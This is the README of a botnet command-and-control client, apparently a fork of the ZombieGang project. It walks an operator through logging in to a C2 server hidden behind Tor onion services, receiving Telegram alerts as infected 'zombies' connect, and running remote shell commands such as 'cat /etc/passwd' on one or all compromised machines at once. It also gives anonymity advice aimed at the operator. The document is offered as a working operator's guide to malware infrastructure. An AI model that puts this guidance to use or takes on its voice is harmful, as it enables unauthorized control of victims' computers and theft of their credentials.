# ZombieGang Master Client - CLI Edition

## Version 1.0.0 - Ubuntu VPS Edition

This is the command-line interface for controlling the ZombieGang botnet. This version has been optimized for Ubuntu VPS deployment with Telegram notifications and Tor v3 hidden service support.

## Features

### ✨ New in v1.0.0
- **CLI-Only Design**: Removed Flask web interface for lighter footprint
- **Telegram Integration**: Real-time notifications for all events
- **Tor v3 Support**: Full support for v3 onion hidden services
- **Bug Fixes**: Improved exception handling and error reporting
- **Ubuntu Optimized**: Designed specifically for Ubuntu VPS deployment

### Core Features
- Remote shell sessions with zombies
- Task scheduling and management
- Multi-zombie control (execute commands on all zombies)
- Proxy support (SOCKS5/Tor)
- Real-time zombie status monitoring
- Secure JWT-based authentication

## Quick Start

### 1. Install Dependencies
```bash
pip3 install -r requirements.txt
```

### 2. Configure (Optional)
```bash
# Copy example config
cp .env.example .env

# Edit with your settings
nano .env
```

### 3. Start CLI
```bash
# Simple start
python3 cli.py

# Or use startup script
./start_cli.sh
```

## Configuration

### Environment Variables

Create a `.env` file with the following variables:

```bash
# Telegram (optional but recommended)
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Tor proxy (optional)
TOR_SOCKS_HOST=127.0.0.1
TOR_SOCKS_PORT=9050
```

### Getting Telegram Credentials

1. **Bot Token**:
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` command
   - Follow instructions to create bot
   - Save the token provided

2. **Chat ID**:
   - Search for `@userinfobot` on Telegram
   - Start a chat with it
   - It will send you your chat ID
   - Save the chat ID

## CLI Commands Reference

### Connection Setup

```bash
# Set username
set USER myusername

# Set password (will prompt securely)
set PSWD

# Set CC server address
set RHOST localhost:8080

# Or use Tor hidden service
set RHOST abcd1234efgh5678.onion

# Login
login
```

### Proxy/Tor Configuration

```bash
# Set proxy host
set PXHOST 127.0.0.1

# Set proxy port
set PXPORT 9050

# Enable proxy
proxy

# Disable proxy
proxy
```

### Zombie Management

```bash
# List all zombies
get zombies

# List specific fields
get zombies id username ip country

# List tasks
get tasks
```

### Remote Shell Sessions

```bash
# Start session with zombie ID 1
start 1

# Execute commands (once in session)
whoami
pwd
ls -la
cat /etc/passwd

# Stop session
stop 1

# Switch to another zombie
set SESSION 2
whoami

# Execute on all zombies
set SESSION all
whoami
```

### Utility Commands

```bash
# Show all variables
show

# Show specific variables
show USER RHOST SESSION

# Get help
help

# Get help for specific command
help start

# Exit
exit
```

## Telegram Notifications

When configured, you'll receive notifications for:

- 🔐 **Master Login**: When you login to CC server
- 🔗 **Session Started**: When remote shell session begins
- 🔌 **Session Stopped**: When remote shell session ends
- ✅ **Task Completed**: When zombie completes a task
- ❌ **Task Failed**: When task execution fails
- 🧟 **Zombie Connected**: When new zombie connects
- 💀 **Zombie Disconnected**: When zombie goes offline
- ⚠️ **Errors**: Critical errors and warnings

## Tor v3 Hidden Services

### Why Use Tor?
- Complete anonymity
- No need for public IP
- Free .onion domain
- End-to-end encryption
- Censorship resistance

### Setup
1. Install Tor: `sudo apt-get install tor`
2. Configure hidden service in `/etc/tor/torrc`:
   ```
   HiddenServiceDir /var/lib/tor/zombiegang/
   HiddenServiceVersion 3
   HiddenServicePort 80 127.0.0.1:8080
   ```
3. Restart Tor: `sudo systemctl restart tor`
4. Get your address: `sudo cat /var/lib/tor/zombiegang/hostname`
5. Use address in CLI: `set RHOST your-address.onion`

### Using with CLI
```bash
# Enable Tor proxy
set PXHOST 127.0.0.1
set PXPORT 9050
proxy

# Connect to hidden service
set RHOST abcd1234efgh5678ijklmnop.onion
login
```

## File Structure

```
master-client/
├── cli.py                      # Main CLI application
├── config.py                   # Configuration
├── requirements.txt            # Dependencies
├── start_cli.sh               # Startup script
├── .env.example               # Example environment config
├── README_CLI.md              # This file
├── app/
│   ├── __init__.py
│   ├── components/
│   │   ├── telegram_notifier.py   # Telegram integration
│   │   ├── proxy.py                # SOCKS/Tor proxy
│   │   ├── logger.py               # Logging system
│   │   ├── zession.py              # Session management
│   │   ├── buffer.py               # Data buffer
│   │   └── token.py                # JWT token handling
│   ├── controllers/
│   │   └── task_controller.py     # Task management
│   ├── models/
│   │   ├── mission.py             # Mission data model
│   │   ├── tasks.py               # Task data model
│   │   ├── attacks.py             # Attack modules
│   │   └── data.py                # Base data model
│   ├── modules/
│   │   ├── crud.py                # CRUD operations
│   │   ├── http_client.py         # HTTP client
│   │   └── plugins.py             # Plugin system
│   └── forms/
│       └── regexps.py             # Input validation
```

## Troubleshooting

### Connection Issues
```bash
# Test CC server is running
curl http://localhost:8080/api/

# Check if port is open
netstat -tlnp | grep 8080

# Test with telnet
telnet localhost 8080
```

### Telegram Not Working
- Verify bot token is correct
- Check chat ID is correct
- Ensure bot is not blocked
- Test bot manually on Telegram
- Check internet connectivity

### Tor Issues
```bash
# Check Tor is running
systemctl status tor

# Check SOCKS port
netstat -tlnp | grep 9050

# Test Tor connection
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org

# View Tor logs
sudo journalctl -u tor -f
```

### Python Errors
```bash
# Reinstall dependencies
pip3 install --force-reinstall -r requirements.txt

# Check Python version (3.8+ required)
python3 --version

# Run in debug mode
# Edit cli.py and set logger.debug = True
```

## Security Best Practices

1. **Use Tor**: Always route through Tor for anonymity
2. **Strong Passwords**: Use complex, unique passwords
3. **Secure Telegram**: Enable 2FA on Telegram account
4. **Keep Token Secret**: Never share your bot token
5. **Update Regularly**: Keep system and dependencies updated
6. **Monitor Logs**: Review logs for suspicious activity
7. **Backup Database**: Regular backups of MariaDB
8. **Firewall**: Use UFW to restrict access
9. **Non-Root User**: Don't run as root
10. **Secure Storage**: Encrypt sensitive data at rest

## Performance Tips

### For VPS with Limited Resources
- Use CLI-only (no web interface overhead)
- Disable Telegram if not needed
- Limit active sessions
- Monitor memory usage
- Use swap if needed

### For Multiple Zombies
- Use `SESSION all` for bulk commands
- Schedule tasks instead of real-time execution
- Monitor CC server load
- Use database indexing

## Advanced Usage

### Custom Task Creation
See `app/controllers/task_controller.py` for creating custom task types.

### Plugin Development
See `app/modules/plugins.py` for plugin system documentation.

### Logging
Logs are written to console and can be redirected:
```bash
python3 cli.py 2>&1 | tee zombiegang.log
```

## Compatibility

- Ubuntu 18.04 LTS or newer
- Debian 10 or newer
- Python 3.8 or newer
- Works with existing zombie clients (no changes needed)

## Migration from Web Version

The CLI version maintains compatibility with existing:
- Zombie clients
- Database schema
- CC server API
- Task system
- Authentication

Simply install CLI dependencies and start using.

## Links

- Quick Start Guide: [CLI_QUICK_START.md](../CLI_QUICK_START.md)
- Full Setup Guide: [CLI_SETUP_UBUNTU.md](../CLI_SETUP_UBUNTU.md)
- Original Project: https://github.com/r3nt0n/zombiegang
- This Fork: https://github.com/bitbybit91/zombiegang

## Support

For issues, questions, or contributions:
- Open an issue on GitHub
- Review the troubleshooting section
- Check existing documentation

## License

GNU General Public License v3.0

## Acknowledgments

- Original ZombieGang by r3nt0n
- Updated CLI version with Telegram and Tor support
- Community contributions and feedback

---

**Version**: 1.0.0  
**Last Updated**: 2025  
**Status**: Stable  
**Platform**: Ubuntu VPS
